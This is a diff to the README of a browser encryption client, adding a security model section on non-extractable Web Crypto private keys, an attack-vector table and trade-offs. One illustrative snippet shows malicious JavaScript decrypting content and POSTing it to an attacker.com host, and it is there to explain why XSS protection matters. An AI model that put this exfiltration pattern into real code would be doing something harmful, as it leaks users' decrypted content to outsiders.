@@ -177,12 +177,115 @@ interface EncryptedPayload {
 }
 ```
 
-## Security Notes
+## Security Model
 
-1. **Private key never leaves the browser** - Stored as non-extractable in IndexedDB
-2. **AES key only in memory** - DEK is decrypted only for immediate use
-3. **Web Crypto API** - Uses hardware-accelerated native cryptography
-4. **RSA-OAEP with SHA-256** - Secure key wrapping compatible with server libraries
+### Private Key Protection: The Core Security Guarantee
+
+The Capsule client's security is built on a fundamental principle: **the private key cannot be extracted from the browser**, even by the user themselves or malicious JavaScript code.
+
+#### How Non-Extractable Keys Work
+
+When generating a key pair, the private key is stored with `extractable: false`:
+
+```typescript
+const privateKey = await crypto.subtle.importKey(
+  "jwk",
+  privateKeyJwk,
+  { name: "RSA-OAEP", hash: "SHA-256" },
+  false, // NOT extractable - this is enforced at the browser engine level
+  ["unwrapKey"]
+);
+```
+
+This means:
+
+- ✅ **The key can be used** for cryptographic operations (unwrapping DEKs)
+- ❌ **The key cannot be exported** in any format (JWK, PKCS8, raw bytes)
+- ❌ **The key cannot be copied** to another device or browser
+- ❌ **The key cannot be downloaded** or sent to a server
+
+#### What About IndexedDB Access?
+
+Users and JavaScript code **can access IndexedDB** through DevTools or browser APIs:
+
+```javascript
+// This works - you can retrieve the key object
+const db = await indexedDB.open("capsule-keys");
+const keyPair = await db.get("keypair", "default");
+console.log(keyPair.privateKey);
+// Output: CryptoKey {type: "private", extractable: false, ...}
+
+// But this FAILS - you cannot export the key material
+await crypto.subtle.exportKey("jwk", keyPair.privateKey);
+// Error: "key is not extractable"
+```
+
+The `CryptoKey` object stored in IndexedDB is just a **handle** or **reference** to the actual key material, which lives in the browser's secure crypto subsystem. Think of it like a key to a safe deposit box that only works inside the bank - you can use it there, but you can't take the contents home.
+
+#### Attack Vector Analysis
+
+| Attack Type                   | Can Extract Private Key? | Notes                                            |
+| ----------------------------- | ------------------------ | ------------------------------------------------ |
+| Server compromise             | ❌ No                    | Key never sent to server                         |
+| Network interception          | ❌ No                    | Key never transmitted                            |
+| XSS/malicious JavaScript      | ❌ No                    | Can _use_ key, but cannot _export_ it            |
+| Browser DevTools access       | ❌ No                    | Can see key object, but not key bytes            |
+| Database breach               | ❌ No                    | No server-side key storage                       |
+| User attempting manual export | ❌ No                    | `extractable: false` prevents all export methods |
+
+The **only** attack that works is using the key for its intended purpose:
+
+```javascript
+// Malicious code CAN do this:
+const decryptedContent = await client.decryptArticle(payload);
+await fetch("https://attacker.com", {
+  method: "POST",
+  body: decryptedContent, // Send decrypted content (not the key!)
+});
+```
+
+This is why **XSS protection** (Content Security Policy, input sanitization) remains critical - not to protect the key itself, but to prevent unauthorized **use** of the key.
+
+### Public vs Private Key: Why Different Extractability?
+
+The key pair has different extractability settings for important reasons:
+
+- **Public Key**: `extractable: true`
+  - Must be exported to SPKI format and sent to the server
+  - Safe to share - it can only _encrypt_, not _decrypt_
+  - Server uses it to wrap DEKs before sending to client
+- **Private Key**: `extractable: false`
+  - Must stay locked in the browser's crypto engine
+  - Can only be used for unwrapping DEKs, never exported
+  - Guarantees end-to-end encryption - server never has decrypt capability
+
+### Additional Security Layers
+
+1. **DEKs in Memory Only**: Unwrapped DEKs are cached in JavaScript memory (not persisted) and lost on page refresh
+2. **AES-GCM Authentication**: 128-bit auth tags prevent tampering with encrypted content
+3. **Web Crypto API**: Uses hardware-accelerated cryptography when available (TPM, Secure Enclave)
+4. **Secure Context Requirement**: Web Crypto API only works over HTTPS or localhost
+5. **Origin Isolation**: IndexedDB is bound to the origin - other websites cannot access your keys
+
+### What This Means for Your Application
+
+✅ **Server compromise cannot leak user keys** - They're not on the server  
+✅ **Database breach cannot decrypt content** - Private keys are client-side only  
+✅ **Network eavesdropping is ineffective** - Only wrapped DEKs are transmitted  
+✅ **Users cannot accidentally export their keys** - Browser prevents it  
+✅ **True end-to-end encryption** - Only the user's browser can decrypt
+
+### Limitations and Trade-offs
+
+⚠️ **Key loss means data loss**: If a user clears browser data or switches devices, they lose access  
+⚠️ **No cross-device sync**: Keys are tied to a single browser profile  
+⚠️ **XSS can still abuse keys**: Malicious code can decrypt content (though not steal keys)
+
+Consider implementing:
+
+- Server-side encrypted key backup (wrapped with user password)
+- Multi-device key synchronization (using secure key exchange protocols)
+- Content Security Policy (CSP) to prevent XSS attacks
 
 ## Browser Compatibility
 
